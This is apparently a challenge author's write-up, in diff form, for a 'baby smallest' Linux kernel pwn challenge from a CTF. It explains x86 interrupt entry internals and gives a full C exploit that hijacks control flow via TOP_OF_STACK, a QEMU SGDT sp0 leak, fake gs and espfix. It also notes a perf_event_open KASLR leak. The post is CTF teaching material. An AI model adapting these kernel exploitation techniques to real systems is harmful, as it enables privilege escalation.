@@ -1,0 +1,311 @@
++++
+title = '🍼🤏🤏 - TRX CTF Quals 2026'
+date = 2026-04-25T15:22:52+02:00
+draft = false
+author = 'leave'
+summary = 'kernel pwn challenge that I wrote for TRX CTF Quals 2026'
+tags = [
+    'linux',
+    'x86'
+]
+toc = true
++++
+
+## Description 
+im a _baby_ and im the _smallest_
+
+DISCLAIMER: difficulty "insane"
+
+NOTE: fsgsbase is enabled + check out the setup, you need to exploit the driver three times in a row in order to get the flag
+
+## Challenge overview
+![driver's assembly](/images/baby_smallest/asm.png)
+
+The driver allows the user to write arbitrary data in a **percpu** variable, the drivers source specify which one it is:
+
+```c
+#define TOP_OF_STACK 0x2c7d8 			// https://elixir.bootlin.com/linux/v6.12.83/source/arch/x86/include/asm/current.h#L24
+
+static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+	asm volatile (
+		".intel_syntax noprefix\n"
+		"mov qword ptr gs:%0, rdx\n"
+		".att_syntax prefix\n"
+		:
+		: "m" (*(const void **)TOP_OF_STACK)
+		: "rdx"
+	);
+	return 0;
+}
+```
+
+## Theory
+### TOP_OF_STACK
+**TOP_OF_STACK** is the **percpu** variable which is used during context switches to change the stack pointer. <br>
+It gets set during the `__switch_to` routine by copying it from the task's struct. <br>
+
+### Context switching
+During the handling of an interrupt the trace goes (generally) as follows:
+- `asm_exc_*`
+    - `error_entry`
+        - `sync_regs`
+- `exc_*`
+
+where `*` represents the name of a generic interrupt. <br>
+
+- `asm_exc_*` is the first function that gets called right after the CPU throws the interrupt, it's the actual function pointer stored in the **IDT**, therefore it assumes to have an iret frame pushed onto the stack. <br>
+The stack that is being used is either **sp0**, if the interrupt has been yielded while executing ring3 code, one of **istN** in case of particular interrupts (**#DF**, **#NMI**, **#DB**, **#MC**) or it stays unchanged if the interrupt has been yielded while executing ring0 code. <br>
+
+- `error_entry` pushes the current context onto the stack, zeroes out general purpose registers, and perform the "context switch routine": 
+    - if it's coming from ring3 code: **swapgs** and then swap to kernel page tables (if **kPTI** is enabled);
+    - if it's coming from ring0 code: it must handle some edge cases, which are not really in-scope. <br>
+    it detects whether we're coming from ring 0 or 3 code based on the value of **cs** in the iret frame pushed onto the stack. <br><br> 
+
+- `sync_regs` pulls **TOP_OF_STACK** from the **percpu** variables and copies the **pt_regs** struct present on the current stack onto it.
+
+As soon as the execution returns to `asm_exc_*`, **rsp** assumes the value of **TOP_OF_STACK** and the execution proceeds by handling the interrupt.
+
+
+## The exploit
+### The primitive
+Now that we know that `sync_regs` copies a **pt_regs** struct onto **TOP_OF_STACK**, we can use the driver as a primitive to copy a **pt_regs** (which can contain a lot of user-controlled data) to an arbitrary address. <br>
+The problem is that, due to some paranoia checks, in `exc_* -> irqentry_enter -> irqentry_enter_from_user_mode` it asserts that the current stack is exactly the one specified in `current->stack`: this means we will have to hijack the control flow before that check.
+
+### The leak
+We could use this primitive as an arbitrary write, but we have no leaks, so the idea is to actually copy **sp0** onto itself. We still require an **sp0** leak, but it isn't a problem because of this: https://kqx.io/post/sp0: given that **QEMU** misses to implement an x86 specification (**UMIP**), we can use the **SGDT** instruction to read from ring3 code the address of the **GDT**, which is at a constant offset from **sp0**. <br>
+Given that at the time of the `sync_regs` copy the current stack can be **sp0** itself we actually have an arbitrary write primitive on the stack. A ROP isn't enough because of the missing kASLR leak. 
+
+### Null byte injection
+We can set **TOP_OF_STACK** to an unaligned **sp0** address to partially overwrite the return address of `sync_regs` and get **rip** hijacking. The problem is that to preserve the kernel address we must overwrite it with the last qword of the **pt_regs** struct, which is the actual user **ss**. Given the we cannot control its highest bytes, instead of a partial overwrite we have a null byte injection on the return address.
+
+### Partial overwrite
+Until now the flow has been: 
+ - `ioctl` interaction to set **TOP_OF_STACK** to an unaligned **sp0**;
+ - "wait" for an interrupt;
+ - push iret frame + context (full **pt_regs** struct);
+ - call `sync_regs` and inject the null byte;
+ - return to the corrupted address;
+
+So now on the stack there is the **pt_regs** struct with the actual user iret frame and the user-controlled registers. <br>
+
+The original `sync_regs` return address goes to the `asm_exc_*` handler, we can now look for the eventual addresses that get generated by injecting the null byte(s) to all `asm_exc_*` handlers. <br>
+Two candidates are: `asm_exc_divide_error` and `asm_sysvec_apic_timer_interrupt` (which doesn't respect the `asm_EXC_*` format, lmao). <br>
+They would respectively return to a `spurious_entries_start` entry and `asm_spurious_interrupt`. <br>
+I chose the `asm_sysvec_apic_timer_interrupt`-`asm_spurious_interrupt` pair (for no particular reason). <br>
+
+Why is this path interesting? Given that it is an actual interrupt handler it assumes that the values currently on the stack represent an iret frame: after our null byte injection it actually finds the **pt_regs**, so **r15**, **r14**, **r13**, **r12** and **rbp** represent the iret frame for the "spurious interrupt" we forced. <br>
+The idea is to replicate the same concept as before, but this time, given we completely fake the iret frame, we can arbitrarly set **ss**, giving an actual partial overwrite primitive on a return address. <br>
+
+Too easy? Well, kind of: `asm_spurious_interrupt` calls `entry_error` which performs another context switching routine, swapping **gs** back to the userland one, we therefore need to set it before starting the hijacking. <br>
+The **percpu** variables get fetched based on **gs** so given that the `sync_regs` called by `asm_spurious_interrupt` uses a user-controlled **gs** we again have full control of **TOP_OF_STACK**, making the partial overwrite possible. This is the step where **fsgsbase** is needed, without it we couldn't set the userland **gs** to a kernel-space address. <br>
+
+### Jumping
+Given that the kernel image alignment is 0x200000, we can overwrite 2 bytes without losing reliability. The functions we can reach in such way are pretty much only those responsible for the context switching. <br>
+The idea is to perform a return to user mode with the faked iret frame, where we can leverage the **eflags** register with: https://kqx.io/post/fw_cfg. <br>
+
+The function we are looking for must: 
+ - pop the context, given that the second `error_entry` pushed a bogus context onto the stack;
+ - swap to userland page tables;
+ - **iretq**;
+ - **swapgs** is not strictly required given that after returning to userland we won't serve interrupts anymore (through **eflags.IF**), so we will never return to kernel-space. However, the path I found actually fixes it.
+
+The function that comes in handy here is `restore_regs_and_return_to_kernel+12`, which is the function used to return to ring 0 code after the interrupt has been handled.
+
+![cool func](/images/baby_smallest/func.png)
+
+It basically asserts it is actually returning to kernel-space, popping the context, **_black magic_** and **iretq**. <br>
+
+The **_black magic_** is checking if **ss** belongs to the **LDT**, if it does, it needs to perform a specific routine: **espfix**. <br>
+In our case, the context pop and the **iretq** aren't enough: the page tables didn't get swapped. <br>
+The **espfix** routine saves us. <br>
+
+
+Due to an x86 quirk, returning to an **LDT** segment can't be done with the actual stack: bits 16:31 of **rsp** may be leaked. <br>
+So the kernel prepares many virtual stacks, 0x10000 pages to cover all 16 leakable bits:
+ - They all map to the same physical page;
+ - Each of them has a different virtual address (so leaked bits look random);
+ - They are read-only (cannot be corrupted);
+ - Randomly assigned to tasks by stashing them in the **espfix_stack** **percpu** variable.
+
+A separate writable alias, which is stored in the **espfix_waddr** **percpu** variable, points to the same memory, so the kernel can still write the return frame.
+
+It gets handled as follow:
+ - **swapgs**;
+ - swap to kernel page tables;
+ - copy the iret frame to **espfix_waddr**;
+ - swap to userland page tables;
+ - **swapgs**;
+ - set **rsp** to the **espfix_stack**;
+ - **iretq**.
+
+More on this at: https://wiki.osdev.org/CPU_Bugs <br>
+
+This routine perfectly fits our case:
+ - the **swapgs** sets it back to the kernel **gs**, so it can fetch the **espfix** variables;
+ - page tables are swapped back to the userland one;
+ - **swapgs** to set it to the userland one;
+ - **iretq**.
+
+The context has already been popped in `restore_regs_and_return_to_kernel`. <br>
+
+Note: Why is the **LDT** check there? <br>
+During normal execution the `restore_regs_and_return_to_kernel` is reached from a kernel-space context, so **gs** is the kernel-space one, if somehow, the **LDT** check would take the jump it would change **gs** to the userland one, executing the **espfix** routine with the wrong **gs**, triggering a pagefault. <br>
+However, this cannot happen because the kernel never uses **LDT** segments, the check is there because of optimization reasons, but it will never take the jump in this context. <br>
+
+### Wrapping up
+So the steps to realize the attack are:
+ - create a valid **LDT** segment to return to after the **espfix** routine;
+ - leak **sp0** with **SGDT**;
+ - set up the fake **gs** with **WRGSBASE**;
+ - interact with the driver to set **TOP_OF_STACK** to the unaligned **sp0**;
+ - set up context with the fake iret frame and the fake **gs** for the second **TOP_OF_STACK** fetch;
+ - loop to wait for a rescheduling interrupt.
+
+After the hijacking, the execution will return to our win function which will dump initrd with **fw_cfg** and scan for the flag.
+
+## Full exploit
+```c
+#define _GNU_SOURCE
+#define __USE_MISC
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+
+#include <asm/ldt.h>
+#include <sys/syscall.h>
+#include <sys/io.h>
+
+#define PAGE_SIZE 0x1000
+typedef unsigned long ul;
+
+#define WRITE_LDT 1
+
+#define FW_CFG_PORT_SEL     0x510
+#define FW_CFG_PORT_DATA    0x511
+#define FW_CFG_INITRD_DATA  0x12
+
+#define MAPPING_SIZE        PAGE_SIZE*0x100
+char* initrd;
+
+void win() {
+    asm(
+        ".intel_syntax noprefix\n"
+        "mov eax, 0x2b\n"
+        "mov ss, eax\n"
+        ".att_syntax prefix\n"
+        :
+        :
+        : "eax"
+    );
+
+    outw(FW_CFG_INITRD_DATA, FW_CFG_PORT_SEL);
+
+    while (1) {
+        for (int i=0; i<MAPPING_SIZE; i++)
+            initrd[i] = inb(FW_CFG_PORT_DATA);
+
+		char* flag = NULL;
+		for (int i=0; i<MAPPING_SIZE; i++){
+			if (!strncmp(initrd+i, "TRX{", 4)) {
+				flag = initrd+i;
+				break;
+			}
+		}
+		
+		if (flag) {
+            for (int j=0; j<0x15; j++)
+                outb(flag[j], 0x3f8);
+			while(1) {}
+        }
+    }
+}
+
+void ldt_palle(){
+    struct user_desc ud = {
+        .entry_number    = 0,
+        .base_addr       = 0x0,
+        .limit           = 0xfffff,
+        .seg_32bit       = 1,
+        .contents        = 0,
+        .read_exec_only  = 0,
+        .limit_in_pages  = 1,
+        .seg_not_present = 0,
+        .useable         = 1,
+    };
+    
+    syscall(SYS_modify_ldt, WRITE_LDT, &ud, sizeof(ud));
+}
+
+int main() {
+    ldt_palle();
+    initrd = mmap(NULL, MAPPING_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+
+    ul stack;
+    int fd = open("/dev/stack", O_RDONLY);
+    char gdt[10];
+    ul gdt_addr;
+    ul sp0;
+    ul fake_gs;
+    ul fake_stack;
+
+    // get sp0
+    asm volatile (
+        ".intel_syntax noprefix\n"
+        "sgdt [%0]\n"
+        ".att_syntax prefix\n"
+        :
+        : "r" (&gdt)
+        :
+    );
+
+    gdt_addr = *(ul*) &gdt[2];
+    sp0 = gdt_addr + 0x1f51;
+    fake_gs = gdt_addr + 0x1f90 - 0x2c7d8;
+    fake_stack = gdt_addr + 0x1eda;
+
+    // fake gs
+    asm volatile(
+        ".intel_syntax noprefix\n"
+        "mov rax, %0\n"
+        "wrgsbase rax\n"
+        ".att_syntax prefix\n"
+        :
+        : "r" (fake_gs)
+        :
+    );
+
+    // hijack
+    ioctl(fd, 0, sp0);
+
+    asm volatile (
+        ".intel_syntax noprefix\n"
+        "mov r14, %0\n"
+        "mov r13, 0x33\n"
+        "mov r12, 0x3206\n"
+        "mov rbp, %1\n"
+        "mov rbx, 0x16a8\n"
+        "shl rbx, 48\n"
+        "or rbx, 0x7\n"
+
+        "mov r10, %2\n"
+
+        "jmp .\n"
+
+        ".att_syntax prefix\n"
+        :
+        : "r" (&win), "r" (((ul) &stack) & (~0xf)), "r" (fake_stack)
+        : "r14", "r13", "r12", "rbx", "r10"
+    );
+
+    return 0;
+}
+```
+
+During the ctf the challenge got solved with an unintended: it was possible to get kaslr leaks with https://github.com/bcoles/kasld/blob/master/src/components/perf_event_open.c, from there the challenge it's pretty easy. <br>
+It could have been mitigated by setting `kernel.perf_event_paranoid=2` in the init file, so I decided to drop a revenge challenge at the 18 hours mark (I also recompiled the kernel with LTS to prevent leaks with ndays).
